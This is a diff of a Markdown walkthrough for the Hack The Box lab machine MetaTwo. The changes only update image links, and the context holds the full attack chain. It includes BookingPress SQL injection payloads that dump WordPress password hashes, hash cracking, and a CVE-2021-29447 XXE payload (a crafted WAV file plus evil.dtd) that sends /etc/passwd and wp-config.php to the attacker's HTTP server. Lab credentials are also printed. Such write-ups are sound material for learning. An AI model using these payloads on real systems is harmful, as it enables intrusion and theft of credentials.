@@ -17,7 +17,7 @@ tags:
 
 
 
-![alt text](/Images/htb/metatwo/MetaTwo.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/MetaTwo.png)
 ## Recon
 ### Rustscan
 
@@ -56,12 +56,12 @@ Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
 
 Unfortunately, anonymous login fails with FTP:
 
-![alt text](/Images/htb/metatwo/image-4.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-4.png)
 
 ## HTTP - TCP 80
 Adding **metapress.htb** to `/etc/hosts` brings me a company website which  leads me to `/events`:
 
-![alt text](/Images/htb/metatwo/image.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image.png)
 
 ### Directory Bruteforce
 
@@ -73,52 +73,52 @@ Feroxbuster finds **123** valid paths, but nothing seems intriguing to me:
 
 At the bottom of the page, there is a search form:
 
-![alt text](/Images/htb/metatwo/image-1.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-1.png)
 
 However, it is not vulnerale to SQLi:
 
 `sudo sqlmap -u http://metapress.htb/?s=hh --dbs --batch`
 
-![alt text](/Images/htb/metatwo/image-3.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-3.png)
 
 
 ## /events Enumeration
 
 `/events` is a page where use can reverse time slot for certain event:
 
-![alt text](/Images/htb/metatwo/image-2.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-2.png)
 
 After reservation, it brings me to thank you page as such:
 
 `http://metapress.htb/thank-you/?appointment_id=MQ==`
 
-![alt text](/Images/htb/metatwo/image-5.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-5.png)
 
 Unfortunately, this page is also not vulnerable to SQLi:
 
-![alt text](/Images/htb/metatwo/image-6.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-6.png)
 
 ## Bookingpress Exploitation
 
 Burp Suite shows multiples js files and one of them reveals the version info for booking press: **ver=1.0.10**
 
-![alt text](/Images/htb/metatwo/image-7.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-7.png)
 
 This version is vulnerable to Unauthenticated SQL Injection:
 
-![alt text](/Images/htb/metatwo/image-8.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-8.png)
 
 [WPScan](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/) elaborates on this vulnerability:
 
 > The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
 
 
-![alt text](/Images/htb/metatwo/image-20.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-20.png)
 
 ### Manual SQLi
 Following the POC above, I can extract the "nonce" from the source code: **047d5a1a7e**
 
-![alt text](/Images/htb/metatwo/image-9.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-9.png)
 
 
 Using the extracted nonce, I modifed the poc command and querying for verion, version_comment, and verion_compile_os confirms SQL injection working:
@@ -133,7 +133,7 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
 | 10.5.15-MariaDB-0+deb11u1     | Debian 11                | debian-linux-gnu          |
 
 
-![alt text](/Images/htb/metatwo/image-10.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-10.png)
 
 
 
@@ -150,7 +150,7 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
 | blog       | blog@localhost | information_schmea,blog   |
 
 
-![alt text](/Images/htb/metatwo/image-12.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-12.png)
 
 
 For some reason, I am not able to query table names from the database blog:
@@ -161,13 +161,13 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
   --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(table_name),@@version,@@version,1,2,3,4,5,6 from information_schema.tables where table_schema='blog';-- -'
 ```
 
-![alt text](/Images/htb/metatwo/image-13.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-13.png)
 
 Since I cannot query table names, I will assume tables names based on public information out there.
 
 Many [articles](https://codex.wordpress.org/Database_Description) out there shows me Wordpress Database structure as such:
 
-![alt text](/Images/htb/metatwo/image-15.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-15.png)
 
 
 I will assume table **wp_users** exists and query **user_login** and **user_pass** from it and luckily it does exists, throwing admin and manager password hashes back at me:
@@ -184,7 +184,7 @@ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
 | manager                 | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70                    |
 
 
-![alt text](/Images/htb/metatwo/image-16.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-16.png)
 
 
 
@@ -197,20 +197,20 @@ Let's first confirm whether parameter **total_service** is vulnerable or not(it 
 
 `sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=1&total_service=1' -p total_service`
 
-![alt text](/Images/htb/metatwo/image-17.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-17.png)
 
 I can dump tables in database blog as such:
 
 
 `sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=1&total_service=1' -p total_service -D blog --tables`
 
-![alt text](/Images/htb/metatwo/image-18.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-18.png)
 
 I can also dump content inside table **wp_users** from database **blog**:
 
 `sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=1&total_service=1' -p total_service -D blog -T wp_users --dump`
 
-![alt text](/Images/htb/metatwo/image-19.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-19.png)
 
 admin - $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
 
@@ -228,7 +228,7 @@ Using hashcat, hash I can crack password hash for manager:
 
 `hashcat -m 400 hash-mananger ~/Downloads/rockyou.txt`
 
-![alt text](/Images/htb/metatwo/Crack.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/Crack.png)
 
 
 Unfortunately, it fails to break the admin hash.
@@ -241,18 +241,18 @@ Using the credentials cracked above, I can sign-in to Wordpress as **manager**:
 
 `http://metapress.htb/wp-admin/profile.php`
 
-![alt text](/Images/htb/metatwo/image-21.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-21.png)
 
 Since **manager** is not an administrator account, there is not much privilege other than uploaing new media:
 
 `http://metapress.htb/wp-admin/media-new.php`
 
-![alt text](/Images/htb/metatwo/image-22.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-22.png)
 
 
 php reverse shell payload fails to upload and all the other file upload evastion trick won't work here:
 
-![alt text](/Images/htb/metatwo/image-23.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-23.png)
 
 ### CVE-2021–29447
 
@@ -276,7 +276,7 @@ I will first create **payload.wav** file what will retrieve **evil.dtd** file fr
 echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.21:8000/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
 ```
 
-![alt text](/Images/htb/metatwo/image-27.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-27.png)
 
 For **evil.dtd** file, I will add in following content so that it will read `/etc/passwd` and send it back to my Python HTTP server:
 
@@ -285,19 +285,19 @@ For **evil.dtd** file, I will add in following content so that it will read `/et
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.21:8000/?p=%file;'>" >
 ```
 
-![alt text](/Images/htb/metatwo/image-28.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-28.png)
 
 When uploading **payload.wav** file, it shows on error on the web app:
 
-![alt text](/Images/htb/metatwo/image-29.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-29.png)
 
 However, on my HTTP server, It sends back base64 encrypted `/etc/passwd`:
 
-![alt text](/Images/htb/metatwo/image-30.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-30.png)
 
 I can use `base64 -d` to decrypt it and it works fine. Note here that there is a user **jnelson** with `/bin/bash` privilege:
 
-![alt text](/Images/htb/metatwo/image-31.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-31.png)
 
 #### Read wp-config.php
 
@@ -312,9 +312,9 @@ I will edit **evil.dtd** file as such to read **wp-config.php**:
 
 Again, repeating the process above, I can obtain base64 encrypted wp-config.php and I will decrypt it as such:
 
-![alt text](/Images/htb/metatwo/image-32.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-32.png)
 
-![alt text](/Images/htb/metatwo/image-33.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-33.png)
 
 Here, credentials for the FTP is leaked: **metapress.htb** - **9NYS_ii@FyL_p5M2NvJ**
 
@@ -331,73 +331,73 @@ define( 'FTP_SSL', false );
 
 Using the credentials found above, I can sign-in to FTP as **metapress.htb**:
 
-![alt text](/Images/htb/metatwo/image-34.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-34.png)
 
 There are two directories: **blog** and **mailer**:
 
-![alt text](/Images/htb/metatwo/image-35.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-35.png)
 
 Inside **mailer**, there is a file named **send_emial.php**
 
-![alt text](/Images/htb/metatwo/image-36.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-36.png)
 
 Downloading and reading the file, it leaks potential credentials for jnelson@metapress.htb: **Cb4_JmWM8zUZWMu@Ys**
 
-![alt text](/Images/htb/metatwo/image-37.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-37.png)
 
 Luckily, **jnelson** is using the same password for SSH and it spawns me SSH connection successfully:
 
-![alt text](/Images/htb/metatwo/image-38.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-38.png)
 
 ## Privesc: jnelson to root
 ### passpie
 
 There is a directory named **.passpie** in jnelson's home directory:
 
-![alt text](/Images/htb/metatwo/image-39.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-39.png)
 
 Inside of it, I see **.keys**, which contains Private and Public PGP Keys:
 
-![alt text](/Images/htb/metatwo/image-40.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-40.png)
 
 PGP keys look like this:
 
-![alt text](/Images/htb/metatwo/image-48.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-48.png)
 
-![alt text](/Images/htb/metatwo/image-49.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-49.png)
 
 Passpie is a password manager software and It is holding root's ssh password:
 
-![alt text](/Images/htb/metatwo/image-42.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-42.png)
 
 Exporting the passwords in plain text requires valid credentials:
 
-![alt text](/Images/htb/metatwo/image-50.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-50.png)
 
 ### Crack Hash
 
 I copied Private PGP keys from **.keys** to **private.pgp** file and will make it crackable using **gpg2john**:
 
-![alt text](/Images/htb/metatwo/image-43.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-43.png)
 
 Now **crackme.hash**, looks like this:
 
-![alt text](/Images/htb/metatwo/image-44.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-44.png)
 
 
 John cracks the password hash with rockyou.txt and password is **blink182**.
 
 `john /usr/share/wordlists/rockyou.txt crackme.hash`
 
-![alt text](/Images/htb/metatwo/image-47.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-47.png)
 
 Using the password, I can export the passwords in plain-text as such:
 
-![alt text](/Images/htb/metatwo/image-45.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-45.png)
 
 Now I have SSH connection as the root:
 
-![alt text](/Images/htb/metatwo/image-46.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/metatwo/Images/htb/metatwo/image-46.png)
 
 
 
